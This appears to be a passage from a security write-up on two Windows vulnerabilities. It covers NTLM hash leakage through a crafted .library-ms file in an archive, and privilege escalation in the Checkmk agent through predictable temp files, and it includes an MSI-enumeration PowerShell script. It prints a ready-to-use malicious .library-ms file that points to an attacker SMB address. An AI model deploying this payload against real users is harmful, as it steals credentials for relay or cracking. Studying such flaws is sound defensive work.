#### CVE-2025-24054

The key point of this vulnerability is that an attacker can include a `.library-ms` file within an archive such as ZIP or RAR, and when the user extracts it, Windows Explorer (or its related components) automatically parses the `.library-ms` file and attempts to access remote SMB paths specified inside it.

A `.library-ms` file is an XML-based descriptor file that defines a Windows Library. Through elements such as `<simpleLocation>`, it can reference local folders and also remote UNC paths (e.g., `\\attacker-IP\share`), making it exploitable.

Windows automatically reads and processes `.library-ms` files to enhance user convenience, providing fast search and preview functionality. This automatic handling runs in the background without requiring the user to open the file manually.

As soon as a compressed file is extracted, the `explorer.exe` and `SearchProtocolHost.exe` processes automatically handle the `.library-ms` file and attempt to connect to the remote UNC path.

During this access, an NTLMv2-based authentication response (NTLMSSP Authenticate blob) may be transmitted to an attacker-controlled SMB server, which can then be exploited for relay or password-cracking attacks.

Creating a malicious `.library-ms` file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.16.137 \share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

##### CVE-2024-0670

CVE-2024-0670 is a local privilege escalation in Checkmk Agent (Windows version 2.1).

In some cases, the Checkmk agent creates temporary files inside `C:\Windows\Temp` and then executes those files. If an attacker successfully write these files and edit their permissions so that no one else can edit them. When Checkmk executes them, it will do so with SYSTEM privileges. Allowing us to execute commands as `NT Authority\SYSTEM`.

There are two problems: 

- These temp files' names are predictable with the pattern `cmk_all_{$Process_ID}_0.cmd`
- The application is not verifying the files' ownership before running them.  

Windows assigns PIDs in increasing order, which allows an attacker to observe currently used PIDs and define a limited range of probable PIDs.

We can list and sort the processes to find out the highest PID as following, to decide what will be the range when creating those files.


luckily, when I searched for a way to connect a `.msi` file to its installed application, I came across this [script](https://learn.microsoft.com/en-in/archive/blogs/leesteve/ps-without-bs-lets-play-wheres-that-msi), which scans all MSI files in the Windows Installer cache folder and extracts their `Product Name`, `Version`, and `Product Code`, and outputting them as a CSV-like list.

```powershell
$Files = Get-ChildItem -Path "$env:windir\Installer\*.msi"
foreach ($File in $Files) {
    try {
        $Installer = New-Object -ComObject WindowsInstaller.Installer
        $DB = $Installer.GetType().InvokeMember("OpenDatabase", "InvokeMethod", $Null, $Installer, @($File.FullName, 0))
        
        $Name = $DB.GetType().InvokeMember("OpenView", "InvokeMethod", $null, $DB, "SELECT Value FROM Property WHERE Property = 'ProductName'")
        $Name.GetType().InvokeMember("Execute", "InvokeMethod", $null, $Name, $null)
        $Rec = $Name.GetType().InvokeMember("Fetch", "InvokeMethod", $null, $Name, $null)
        $ProductName = $Rec.GetType().InvokeMember("StringData", "GetProperty", $null, $Rec, 1)
        
        $Ver = $DB.GetType().InvokeMember("OpenView", "InvokeMethod", $null, $DB, "SELECT Value FROM Property WHERE Property = 'ProductVersion'")
        $Ver.GetType().InvokeMember("Execute", "InvokeMethod", $null, $Ver, $null)
        $Rec = $Ver.GetType().InvokeMember("Fetch", "InvokeMethod", $null, $Ver, $null)
        $ProductVersion = $Rec.GetType().InvokeMember("StringData", "GetProperty", $null, $Rec, 1)
        
        $Code = $DB.GetType().InvokeMember("OpenView", "InvokeMethod", $null, $DB, "SELECT Value FROM Property WHERE Property = 'ProductCode'")
        $Code.GetType().InvokeMember("Execute", "InvokeMethod", $null, $Code, $null)
        $Rec = $Code.GetType().InvokeMember("Fetch", "InvokeMethod", $null, $Code, $null)
        $ProductCode = $Rec.GetType().InvokeMember("StringData", "GetProperty", $null, $Rec, 1)
        
        Write-Host "$($File.Name),$ProductName,$ProductVersion,$ProductCode"
        
    } catch {
        Write-Warning "$($File.Name) - Error: $($_.Exception.Message)"
    }
}
```
